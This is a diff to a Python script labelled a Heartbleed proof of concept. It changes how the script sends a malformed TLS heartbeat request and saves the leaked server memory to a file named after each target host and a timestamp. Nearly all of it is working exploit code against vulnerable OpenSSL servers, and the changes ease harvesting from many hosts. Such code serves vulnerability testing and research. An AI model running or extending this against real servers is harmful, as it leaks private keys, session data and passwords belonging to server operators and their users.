@@ -49,39 +49,39 @@ def recvall(sock, count):
         count -= len(newbuf)
     return buf
 
-def hit_hb(s):
+def hit_hb(s, output_file):
     s.send(hb)
-    
-    response_data = b''  # Initialize an empty bytes object to store the response data
-    
+
+    response_data = b''
+
     while True:
         hdr = s.recv(5)
         if hdr is None:
             print('Unexpected EOF receiving record header - server closed connection')
             return False
         (content_type, version, length) = struct.unpack('>BHH', hdr)
-        
+
         if content_type is None:
             print('No heartbeat response received, server likely not vulnerable')
             return False
-        
+
         pay = recvall(s, length)
         if pay is None:
             print('Unexpected EOF receiving record payload - server closed connection')
             return False
-        
+
         sys.stdout.write(' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(pay)))
         print('')
-        
-        response_data += pay  # Append the received payload to the response_data
-        
+
+        response_data += pay
+
         if content_type == 24:
             print('Received heartbeat response, saving to file...')
-            with open('response_data.bin', 'wb') as file:
-                file.write(response_data)  # Save the response_data to a binary file
-            print('File saved as response_data.bin')
+            with open(output_file, 'wb') as file:
+                file.write(response_data)
+            print('File saved as', output_file)
             return True
-        
+
         if content_type == 21:
             print('Received alert:')
             hexdump(pay)
@@ -91,9 +91,14 @@ def hit_hb(s):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Heartbleed PoC')
-    parser.add_argument('host', help='hostname or IP address')
-    parser.add_argument('port', type=int, help='TCP port number', nargs='?', default=443)
+    parser.add_argument('-s', '--host', required=True, help='hostname or IP address')
+    parser.add_argument('-p', '--port', type=int, default=443, help='TCP port number')
+    parser.add_argument('-f', '--output_file', default='', help='output file name')
     args = parser.parse_args()
+
+    if not args.output_file:
+        timestamp = int(time.time())
+        args.output_file = f'{args.host}_{timestamp}.bin'
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print('Connecting...')
@@ -111,5 +116,5 @@ if __name__ == '__main__':
 
     print('Handshake done...')
     print('Sending heartbeat request with length 4:')
-    hit_hb(s)
+    hit_hb(s, args.output_file)
 
